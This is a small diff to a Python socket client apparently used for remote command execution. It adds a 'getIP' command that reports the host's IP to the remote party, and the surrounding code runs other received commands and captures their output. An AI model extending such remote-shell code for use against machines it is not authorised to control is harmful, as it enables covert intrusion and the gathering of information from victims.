@@ -222,6 +222,9 @@ def clientLoop():
             elif command == "ENDCONNECTION":
                 s.close()
                 break
+            elif command == "getIP":
+                IP = socket.gethostbyname(socket.gethostname())
+                s.send(IP.encode())
             else: #if the user doesn't want to perform a special action, run the command and capture the output
                 #if the command runs for longer than 5 seconds, timeout
                 try:
